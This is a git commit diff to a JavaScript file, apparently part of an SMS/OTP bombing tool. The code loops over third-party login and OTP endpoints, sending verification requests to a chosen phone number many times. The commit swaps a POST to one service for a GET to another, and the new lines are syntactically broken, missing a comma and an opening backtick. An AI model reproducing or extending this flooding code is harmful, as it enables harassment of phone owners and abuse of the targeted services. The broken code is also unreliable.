6f736f925173066ec2b77be3e9a2991ee498e732
ROWDYBOY999 <168767690+ROWDYBOY999@users.noreply.github.com>
2024-05-03 00:39:29 +0600

    Update script.js

--- assets/script.js
+++ assets/script.js
@@ -56,9 +56,8 @@ $(document).ready(() => {
                     while (c < amount) {
                         APIS.forEach(API => {
                             config = {
-                                url: "https://ss.binge.buzz/otp/send/login",
-                                method: "POST",
-                                body: `phone=${mobile}`
+                                method: "GET"
+                                    url: https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${mobile}`
                             }
                             $.ajax(config);
                             c += 1;
